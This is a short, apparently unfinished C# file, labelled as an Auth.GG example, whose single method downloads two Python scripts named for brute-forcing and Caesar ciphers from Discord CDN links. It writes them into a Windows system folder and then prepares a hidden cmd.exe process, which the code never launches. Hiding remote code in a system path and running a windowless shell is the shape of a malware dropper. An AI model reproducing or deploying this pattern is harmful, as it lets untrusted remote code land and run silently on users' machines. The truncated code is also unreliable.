using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class Phyton
    {

        public static void dl()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\PLA\System\Hex_BruteForce.py";
            string text1 = @"C:\Windows\PLA\System\Hex_Caesar.py";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855532742594002974/Hex_BruteForce.py", text);
            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855532745664364544/Hex_Caesar.py", text1);


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;













        }
    }

}

